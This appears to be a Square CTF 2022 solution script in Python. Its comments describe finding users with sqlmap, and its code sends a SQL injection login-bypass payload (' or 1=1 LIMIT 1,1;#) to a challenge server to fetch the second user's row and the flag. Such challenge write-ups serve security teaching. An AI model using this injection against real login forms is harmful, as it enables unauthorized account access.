""" Solution

    Simple SQLI, using sqlmap we see users admin/ahanlon

    Using creds ahanlon:ahanlon didn't work for some reason, so used the sql injection to return the second row (ahanlon:ahanlon) and was able to get the flag this way

    """

""" Post Mortem

    If you have sql injection, and they are filtering for a specific user, instead of returning all of
      the rows and having it select the first one, just return row by row so it gets all the users

    """

import requests

def main():
  resp = requests.post(
    'http://chals.2022.squarectf.com:4102/',
    data={
      'username': '\' or 1=1 LIMIT 1,1;#',
      'password': ''
    }
  )

  print(resp.text)


if __name__ == '__main__':
  main()
